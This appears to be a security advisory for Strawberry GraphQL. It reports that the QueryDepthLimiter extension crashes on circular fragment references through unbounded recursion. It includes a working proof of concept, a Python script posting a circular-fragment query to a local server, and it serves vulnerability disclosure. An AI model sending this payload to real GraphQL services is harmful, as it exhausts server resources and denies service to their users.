summary: "Strawberry GraphQL has a Circular Fragment Reference DOS\n### Summary\nThe QueryDepthLimiter\
  \ extension is vulnerable to an Application-level DOS due to a lack of cycle detection in\
  \ fragment spreads. When a query contains circular fragment references the determine_depth\
  \ function enters an infinite recursion, leading to a RecursionError and crashing the validation\
  \ process.\n\n### Details\nThe determine_depth function in query_depth_limiter.py recursively\
  \ resolves FragmentSpreadNode without maintaining a set of visited fragments.\nBy submitting\
  \ a query with circular fragment references (e.g., Fragment A $\\rightarrow$ Fragment B $\\\
  rightarrow$ Fragment A), the validator enters an infinite recursion.\n\n### PoC\n**server\
  \ code**\n```\nimport strawberry\nfrom fastapi import FastAPI\nfrom strawberry.fastapi import\
  \ GraphQLRouter\nfrom strawberry.extensions import QueryDepthLimiter\n\n@strawberry.type\n\
  class User:\n    name: str = \"GONA\"\n\n@strawberry.type\nclass Query:\n    @strawberry.field\n\
  \    def user(self) -> User:\n        return User()\n\n# Enable depth limiting\nschema = strawberry.Schema(\n\
  \    query=Query, \n    extensions=[QueryDepthLimiter(max_depth=10)]\n)\n\napp = FastAPI()\n\
  app.include_router(GraphQLRouter(schema), prefix=\"/graphql\")\n```\n\n**exploit**\n```\n\
  import httpx\n\n# Circular reference: A -> B -> A -> B ...\npayload = {\n    \"query\": \"\
  \"\"\n        fragment A on User {\n            ...B\n        }\n        fragment B on User\
  \ {\n            ...A\n        }\n        query Crash {\n            user {\n            \
  \    ...A\n            }\n        }\n    \"\"\"\n}\n\ntry:\n    response = httpx.post(\"http://127.0.0.1:8000/graphql\"\
  , json=payload)\n    print(response.json())\nexcept Exception as e:\n    print(f\"Server crashed\
  \ or timed out: {e}\")\n```\n\n### Impact\nSince the validation happens before execution,\
  \ an attacker can cheaply trigger this recursion error to exhaust server CPU cycles and thread/worker\
  \ pools"
